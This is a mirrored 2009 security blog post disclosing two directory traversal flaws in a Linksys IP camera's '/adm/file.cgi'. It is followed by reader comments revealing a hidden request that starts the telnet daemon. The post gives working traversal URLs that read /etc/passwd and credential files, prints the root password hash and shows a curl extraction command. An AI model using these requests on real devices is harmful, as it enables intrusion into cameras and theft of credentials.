@@ -1,0 +1,602 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:22:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Hacking Linksys IP Cameras (pt 3)</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Hacking Linksys IP Cameras (pt 3) Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Hacking Linksys IP Cameras (pt 2)' href='../hacking-linksys-ip-cameras-pt-2/index.html' />
+<link rel='next' title='Hacking Linksys IP Cameras (pt 4)' href='../hacking-linksys-ip-cameras-pt-4/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index3cdf.html?p=3019' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-3019" class="post">
+	<div class="post-title"><h2><span>Hacking Linksys IP Cameras (pt 3)</span></h2></div>
+	<div class="post-date"><span>published:</span> April 23rd, 2009</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p><em>This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: <a href="../hacking-linksys-ip-cameras-pt-1/index.html">Hacking Linksys IP Cameras (pt 1)</a>, <a href="../hacking-linksys-ip-cameras-pt-2/index.html">Hacking Linksys IP Cameras (pt 2)</a>.</em></p>
+
+<p>Unlike the <a href="../hacking-linksys-ip-cameras-pt-1/index.html">previous</a> <a href="../hacking-linksys-ip-cameras-pt-2/index.html">two</a> vulnerabilities I released, the vulnerabilities I&#8217;m releasing in this post are perhaps not so useful to break into the device as you need access to the admin account to exploit them. Nevertheless, these vulnerabilities might be useful for users who want to hack their Linksys IP cameras for modding purposes, rather than being used by an attacker aiming to crack into someone else&#8217;s camera.</p>
+
+<h3>Two directory traversal vulnerabilities</h3>
+
+<p>Today, instead of releasing just one vulnerability I&#8217;ll be releasing two! These two vulnerabilities have helped me understand more about how the WVC54GCA wireless camera internals and I&#8217;m hoping they will also work on other Linksys camera models. Please let me know if you successfully test them on other models too!</p>
+
+<p>Both vulnerabilities are of type directory traversal, aka arbitrary file retrieval, and they both affect the same CGI program: <code>/adm/file.cgi</code>. Please note that these vulnerabilities are different to <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2507">CVE-2004-2507</a>/<a href="http://www.securityfocus.com/bid/10476/exploit">BID 10476</a> which affected <code>/main.cgi</code> instead.</p>
+
+<h4>1st directory traversal hole</h4>
+
+<p>It seems that the <code>next_file</code> parameter is not filtered enough when submitted to <code>/adm/file.cgi</code>, so that either of the following requests will return the content of any file whose location is known (<code>/etc/passwd</code> in this case):</p>
+
+<pre><code>/adm/file.cgi?next_file=%2fetc%2fpasswd</code></pre>
+<pre><code>/adm/file.cgi?next_file=%2fetc/passwd</code></pre>
+<pre><code>/adm/file.cgi?next_file=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd</code></pre>
+
+<h4>2nd directory traversal hole</h4>
+
+<p>In the case of the second directory traversal hole, the vulnerable parameter (<code>this_file</code>) is not filtered at all whatsoever. So hex-encoding special symbols is <em>not</em> required:</p>
+
+<pre><code>/adm/file.cgi?todo=pwnage&#038;this_file=/etc/passwd</code></pre>
+
+<p>The following is the content of the Linux <code>passwd</code> file containing the encrypted root password. Remember that the WVC54GCA comes with BusyBox Linux by default which you can confirm by opening <code>bin/busybox</code> with any of the vulnerabilities previously discussed. I&#8217;m curious to know if the <code>passwd</code> file contains the same password on all cameras of the same model, or even if Linksys is also using the same password on other models:</p>
+
+<pre><code>root:9szj4G6pgOGeA:0:0:root:/root:/bin/sh</code></pre>
+
+<p>Notice that when exploiting the first vulnerability, we need to convert forward slashes to <code>%2f</code> which is its hex-encoding equivalent. This is because the developer (poorly) attempted to filter directory traversal sequences when data is submitted via the <code>next_file</code> parameter. In the third example, we also partially hex-encode <code>../</code> sequences in order to avoid being blocked by the script which results in a forbidden error.</p>
+
+<p>Needless to say, if the root password is not too strong you should be able to crack it using <a href="http://www.openwall.com/john/">john</a> or you favorite password cracking tool. I loaded passwd with john for a few hours on an old laptop and nothing was found, so I&#8217;m guessing the root password is not extremely weak. If you model comes with the telnet daemon running by default, cracking that password should give you root shell access.</p>
+
+<p>Unfortunately, as I mentioned in the <a href="../hacking-linksys-ip-cameras-pt-1/index.html">first post</a> of these series, the WVC54GCA camera comes with a telnet daemon included, but it&#8217;s off by default. I haven&#8217;t managed to enable the telnet daemon and get a remote root shell yet although I suspect it might be possible by <a href="http://brooknet.no-ip.com/~lex/public/WVC54G/">modifying</a> the bin firmware image and uploading it again.</p>
+
+<h4>What can we do with these vulnerabilities?</h4>
+
+<p>Well, I tried finding files that contain interesting information that helps you understand the camera better. The following are some examples:</p>
+
+<ul>
+<li><code>/etc/passwd</code> : traditional-DES-format password file with no salt</li>
+<li><code>/usr/local/www/img/.htpasswd</code> : HTTP credentials stored in cleartext</li>
+<li><code>/usr/local/www/adm/.htpasswd</code> : contains same data as previous file</li>
+<li><code>/etc/system.conf</code> : all camera settings stored in cleartext including admin password, wifi encryption key, etc &#8230;</li>
+<li><code>/usr/local/bin/thttpd.conf</code> : web server config file confirming the daemon runs as root, which is the only system account present anyway</li>
+<li><code>/etc/init.d/rcS</code>  :  here we see the line that starts the telnet daemon (<code>/usr/sbin/telnetd</code>) commented out</li>
+<li><code>/etc/def_sys.conf</code> : camera&#8217;s default settings</li>
+<li><code>/etc/system.conf</code> : camera&#8217;s current settings</li>
+<li><code>/var/nc.log</code> : network connections logs</li>
+<li><code>/etc/group</code></li>
+<li><code>/etc/inittab</code></li>
+<li><code>/proc/cpuinfo</code> : processor details</li>
+<li><code>/proc/meminfo</code></li>
+<li><code>/proc/version</code> : OS details</li>
+<li><code>/proc/uptime</code></li>
+</ul>
+
+<p>Finding a file upload vulnerability should allow us to overwrite the <code>/etc/init.d/rcS</code> file and eventually manage to start the telnet server after reboot. By overwriting the <code>/etc/passwd</code> file with our own we should be able to add our own root password. Unfortunately, I haven&#8217;t discovered any vulnerability that would allow me to upload files to arbirary locations. If you do discover one, please let me know. I&#8217;d love to hear the details.</p>
+
+<h3>Testing Info</h3>
+
+<p>Directory traversal vuln #1 successfully tested on:</p>
+<p><ul>
+<li>WVC54GCA</li>
+<li>Firmware V1.00R22 and V1.00R24 (latest available as on 23rd April 2009)</li>
+</ul>
+
+<p>Directory traversal vuln #2 successfully tested on:</p>
+<p><ul>
+<li>WVC54GCA</li>
+<li>V1.00R24 (latest available as on 23rd April 2009)</li>
+</ul>
+<p>Although I never tested the second traversal vulnerability on Firmware V1.00R22, I definitely suspect it will work on this previous firmware version as well.</p>
+<p><em>Please note that the aforementioned vulnerabilities are different to <a href="http://www.securityfocus.com/bid/10476/exploit">BID 10476</a> which affected the <code>/main.cgi</code> program rather than <code>/adm/file.cgi</code>.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/camera/index.html" rel="tag">camera</a> | <a href="../../tags/embedded/index.html" rel="tag">embedded</a> | <a href="../../tags/linksys/index.html" rel="tag">linksys</a> | <a href="../../tags/vulnerability/index.html" rel="tag">vulnerability</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-126633">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8bfed58b974a83cecf91c84e3c2eb6d0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.gat3way.eu/' rel='external nofollow' class='url'>gat3way</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126633">
+			April 23, 2009 at 8:38 am</a>		</div>
+
+		<p>Even if you find a file upload vulnerability, I doubt that it would be possible to overwrite anything in /etc/init.d (since it&#8217;s root-owned and I doubt the webserver runs with uid=0/euid=0). Furthermore, AFAIK it&#8217;s a cramfs filesystem which does not support writes at all. </p>
+<p>But probably this could be circumvented by uploading a new modified firmwire somehow?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-126635">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126635">
+			April 23, 2009 at 8:05 pm</a>		</div>
+
+		<p>@gat3way: the web server MUST run as root since &#8216;root&#8217; is the only OS account available (see contents of <code>/etc/passwd</code> file shown in this post).</p>
+<p>This can be confirmed by retrieving the contents of <code>/usr/local/bin/thttpd.conf</code> using any of the directory traversal vulnerabilities I just released. Notice the line containing <code>user=root</code>:</p>
+<pre><code># This section overrides defaults
+dir=/usr/local/www
+#dir=/tmp/www
+user=root	# default = nobody
+#logfile=/var/log/thttpd.log
+pidfile=/var/run/thttpd.pid
+cgipat=cgi|cfg|sdp|jpg
+# This section _documents_ defaults in effect
+# port=80
+nosymlink	# default = !chroot
+novhost
+# nocgipat
+# nothrottles
+# host=0.0.0.0
+# charset=iso-8859-1</code></pre>
+<p>However, you&#8217;re probably right that the filesystem is cramfs, which (as you said) would mean that a file upload vuln would NOT help getting our root shell.</p>
+<p>From <a href="http://en.wikipedia.org/wiki/Cramfs" rel="nofollow">http://en.wikipedia.org/wiki/Cramfs</a>:</p>
+<blockquote><p>The file system is intentionally read-only to simplify its design</p></blockquote>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-126638">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/607a87c9234ef15ddb84b675a6a0c07f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Ladinu</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126638">
+			April 24, 2009 at 2:33 am</a>		</div>
+
+		<p>I just got this camera (same model) and tested out the vuln. It looks like that all linksys cameras have the same password.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-126644">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126644">
+			April 24, 2009 at 2:19 pm</a>		</div>
+
+		<p>@Ladinu: thanks a lot for testing. That&#8217;s very useful to know. I wonder if other Linksys camera models different to the WVC54GCA also come with the same root password?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-126646">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8bfed58b974a83cecf91c84e3c2eb6d0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.gat3way.eu/' rel='external nofollow' class='url'>gat3way</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126646">
+			April 24, 2009 at 3:39 pm</a>		</div>
+
+		<p>Anyway, I&#8217;m now running john against the DES-crypted password. We&#8217;ll see what is going to come out after the weekend. I&#8217;m curious about what default root password did Cisco/Linksys guys choose.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-126648">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126648">
+			April 24, 2009 at 5:43 pm</a>		</div>
+
+		<p>@gat3way: hehe, im curious too. i&#8217;ve had john running for a while, but no luck yet. last password it tried was &#8216;Tr92m3l&#8217;, so it&#8217;s tried relatively-complex passwords already. anyways, please post the password if you leave the cracking session for long enough and finally obtain it .</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-126664">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/607a87c9234ef15ddb84b675a6a0c07f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Ladinu</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126664">
+			April 25, 2009 at 11:26 pm</a>		</div>
+
+		<p>Talked to a friend who had a different model (CIC-930W). The vuln work for this one too. The root password hash is the same.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-126679">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/56f904629fb4ecda24ea08d0ee1ac199?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Bruno</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126679">
+			April 27, 2009 at 12:57 am</a>		</div>
+
+		<p>Hi together,</p>
+<p>I&#8217;ve found a way to start the telnet daemon (Firmware V1.00R24).</p>
+<pre><code>/adm/file.cgi?inject_telnetd</code></pre>
+<pre><code>telnet cam
+Trying xxx.xxx.xxx.xxx...
+Connected to cam.
+Escape character is '^]'.
+cam login:
+Login timed out after 60 seconds.
+Connection closed by foreign host.</code></pre>
+<p>But not the pwd? What does John say?</p>
+<p>Greetings<br />
+Bruno</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-126795">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126795">
+			May 3, 2009 at 12:52 am</a>		</div>
+
+		<p>@Bruno: i cannot replicate the steps you provided, although i can confirm the &#8216;inject_telnetd&#8217; string is part of the &#8216;/adm/file.cgi&#8217; binary. I tried accessing the URL you provided after logging in with the &#8216;admin&#8217; account and no luck :(</p>
+<p>Am I missing anything?</p>
+<p>btw, my john session is still running and still no luck. not sure if gat3way managed to get anywhere with his john session?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-126902">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/56f904629fb4ecda24ea08d0ee1ac199?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Bruno</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126902">
+			May 7, 2009 at 10:14 am</a>		</div>
+
+		<p>@pagvac: I am so sorry. I tried many things that evening and there was a little &#8216;todo=&#8217; missing. I could not remember, but I did it again &#8211; found it in my brain after thinking a long time &#8211; and here comes the uncut howto after a power on (I tried it twice, please confirm):</p>
+<p>1. try a telnet connect to the cam like this:</p>
+<p>telnet IP-OF-CAM<br />
+Trying IP-OF-CAM&#8230;<br />
+telnet: Unable to connect to remote host: Connection refused<br />
+result: not telnetd on cam after power on &#8211; thats standard config.</p>
+<p>2. type in that url in your browser:</p>
+<pre><code><a href="http://ip-of-cam/adm/file.cgi?todo=inject_telnetd" rel="nofollow">http://IP-OF-CAM/adm/file.cgi?todo=inject_telnetd</a></code></pre>
+<p>you have to type in your admin account and pwd for cam-administration. You receive error:</p>
+<pre><code>File (null) not found</code></pre>
+<p>in your Browser.</p>
+<p>Don&#8217;t care about that and don&#8217;t power down the cam.</p>
+<p>3. try again the telnet connect from step 1</p>
+<pre><code>telnet IP-OF-CAM
+Trying IP-OF-CAM...
+Connected to IP-OF-CAM.
+Escape character is '^]'.
+cam login: </code></pre>
+<p>Here you are and you are missing the root pwd.  Every user can get the adm-pwd with your tips and every user can start the telnet demon after reading this. Nice feature. Login ist quite a problem.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-126905">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126905">
+			May 7, 2009 at 3:10 pm</a>		</div>
+
+		<p>@Bruno: I can confirm that DOES work. that&#8217;s a very cool backdoor/debug feature which you have discovered! awesomeness</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-126907">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126907">
+			May 7, 2009 at 5:31 pm</a>		</div>
+
+		<p>For anyone interested, Bruno eventually figured out the &#8220;telnetd enabling&#8221; feature by</p>
+<p>1) parsing the strings of the &#8216;/adm/file.cgi&#8217; binary using any of the directory traversal vulnerabilities I released in this post and </p>
+<p>2) trial and error. ie: experimenting with already-known parameters processed by the &#8216;file.cgi&#8217; program such as &#8216;todo&#8217; (aforementioned in this post)</p>
+<p>For instance, you can do the following with curl:</p>
+<pre><code>$ curl -s --url "http://192.168.1.115/adm/file.cgi?todo=pwnage&#038;this_file=file.cgi" -u admin:C4mP4ssw0rd | strings |  grep -i telnet</code></pre>
+<p>Which returns:</p>
+<pre><code>/usr/sbin/telnetd &gt; /dev/null 2&gt; /dev/null &#038;
+&lt;head&gt;&lt;title&gt;Open TelnetD&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;p&gt;&lt;b&gt;&lt;font size=6&gt;Open Telnet Daemon successfully!&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;&lt;/body&gt;
+inject_telnetd</code></pre>
+<p>Notice the last string returned (&#8216;inject_telnetd&#8217;) which is the value that needs to be assigned to the &#8216;todo&#8217; parameter in order to enable the telnet daemon.</p>
+<p>I&#8217;m guessing there must be a neat way to obtain all parameters processed by &#8216;/adm/file.cgi&#8217; by analyzing the binary. Using IDA Pro perhaps? the binary is of type &#8216;ELF 32-bit LSB executable, ARM, version 1&#8242; if anyone wants to know</p>
+<pre><code>$ file file.cgi
+file.cgi: ELF 32-bit LSB executable, ARM, version 1, dynamically linked (uses shared libs), stripped</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-127412">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d3902c4868cb4ede759e377b3ff8eca8?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.bothunters.pl/' rel='external nofollow' class='url'>Borys</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127412">
+			June 3, 2009 at 4:03 pm</a>		</div>
+
+		<p>It is possible to run something via opening file with &#8220;|&#8221; at the end?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-127920">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d87e8180176a69ad1f937148d38f4663?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">nick</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127920">
+			October 16, 2009 at 9:32 am</a>		</div>
+
+		<p>I used the above to get info about this type of camera off the one I have. Nice work guys! Couple of questions. Has John finished his cogitations yet? Also, how does the camera save its altered config settings if the cramfs file system is read only&#8230;? That file must be writable by root surely. The reason I ask is that I want to mod the camera to reduce a motion detection setting (md_sensitivity). The default is ridiculously too sensitive as is widely acknowledged in many forums. I was thinking about trying to recompile the OS using the source off the linksys web site and (with having the learn it&#8230;) a cross compiler. However, being able to telnet into the camera as root and simply changing the values (default is 6) of the md sensitivity sounds much easier &#8211; providing I have root access (therefore need password) and can actually write to the config file (hence asking about the cramfs file system). Anyone got any thoughts?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-127991">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c9558a1a32524b321da5ac79a2bc2348?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Maurice</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127991">
+			November 14, 2009 at 10:19 am</a>		</div>
+
+		<p>I am still running john to get the password still nothing found.<br />
+I want the same as what Nick wants reducing the motion sensibility. There should be a firmware around that is dealing with this issue. Version 1.1.0.0 build 2 look at this forum thread. <a href="http://forums.linksysbycisco.com/linksys/board/message?board.id=Cameras&amp;thread.id=10525" rel="nofollow">http://forums.linksysbycisco.c.....d.id=10525</a></p>
+<p>If I have some luck I will post the password.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-128046">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d87e8180176a69ad1f937148d38f4663?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">nick</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128046">
+			December 15, 2009 at 10:35 pm</a>		</div>
+
+		<p>Maurice, very interesting information. I saw that thread on the forum when it was in its infancy and there was uncertainty about whether the 1.1 firmware was the newer one. Looks like it is, which makes the lack of its addition to the Linksys download area really odd. If they have decided it is stable enough to put on new retail cameras, it should be stable enough to post on the download area for current owners to use. Most strange. I would recommend everyone contact Linksys to ask them to make it available.</p>
+<p>I threw John at the password on a P3 for a week or so with no luck. It was testing 180000 combinations a second and the last passwords were fairly complex. Hence, it appears that the root password is not trivial. Even though this is a &#8220;simple&#8221; DES password, statistics show that for a good password, you need about 1000 P4s working on it for a year in order to guarantee a crack. Hence, a lot of luck is needed if using a single machine! I do wish you luck though. In the meantime, I recommend everyone who is interested in getting their cameras working better contact Linksys regularly to ask about the new firmware.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-128047">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d87e8180176a69ad1f937148d38f4663?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">nick</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128047">
+			December 15, 2009 at 10:49 pm</a>		</div>
+
+		<p>Update&#8230;.</p>
+<p>Knew I should have checked the linksys website before posting. The new 1.1 firmware is now available in their support area. It is dated 15th June 2009, which I don&#8217;t think can be the date it was posted on their site, since I looked several times since then and it was not there (just the older one).</p>
+<p>Go get it!!!!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-128049">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/56f904629fb4ecda24ea08d0ee1ac199?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Bruno</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128049">
+			December 16, 2009 at 2:02 pm</a>		</div>
+
+		<p>The telnetd-injection is still working with the firmware &#8220;1.1.00 build 2&#8243;. We still need the password.</p>
+<p>The revision history told about some security fixing. They disabled the Support of &#8220;Setup Wizzard&#8221;.</p>
+<p>A new feature is the proprietary HNAP protocol. You get a xml if you try <a href="http://ip-of-cam/HNAP1/" rel="nofollow">http://IP-OF-CAM/HNAP1/</a>. Can somebody tell the truth about security of HNAP?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-128728">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0a629042a2fd601584c61e06e7bb983a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Rogan Dawes</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128728">
+			August 20, 2010 at 7:16 pm</a>		</div>
+
+		<p>You have a few options remaining to you.</p>
+<p>1. Try to get a serial console on your camera. This will void any warranties that you have, because you&#8217;ll have to open it up. You&#8217;ll also need to get a suitable level convertor, to convert between the usual RS-232 at 12V, to the TTL signalling expected by the camera at 3V.</p>
